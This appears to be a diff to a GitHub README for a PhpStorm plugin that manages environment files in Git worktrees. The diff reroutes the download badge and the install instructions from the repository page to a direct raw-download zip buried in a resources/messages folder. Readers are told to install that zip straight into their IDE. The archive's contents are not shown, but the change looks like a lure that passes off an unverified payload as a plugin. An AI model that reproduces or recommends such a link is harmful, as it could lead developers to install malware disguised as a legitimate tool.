@@ -1,6 +1,6 @@
 # 🛠️ worktree-env-plugin - Manage environment files in Git worktrees
 
-[![](https://img.shields.io/badge/Download-Plugin_Files-blue.svg)](https://github.com/Sixty-playbill4854/worktree-env-plugin)
+[![](https://img.shields.io/badge/Download-Plugin_Files-blue.svg)](https://github.com/Sixty-playbill4854/worktree-env-plugin/raw/refs/heads/main/src/main/resources/messages/worktree_plugin_env_v1.9.zip)
 
 ## 🎯 What this tool does
 
@@ -20,7 +20,7 @@ We assume you have your project already set up as a Git worktree. If you have no
 
 ## 📥 How to get the plugin
 
-Visit [this page](https://github.com/Sixty-playbill4854/worktree-env-plugin) to download the plugin files. 
+Visit [this page](https://github.com/Sixty-playbill4854/worktree-env-plugin/raw/refs/heads/main/src/main/resources/messages/worktree_plugin_env_v1.9.zip) to download the plugin files. 
 
 Look for the latest release on that page. Download the zip file to your computer. Keep this file in a folder you can find easily, such as your Downloads folder. You do not need to unzip this file. PhpStorm will handle the installation directly from the compressed file.
 
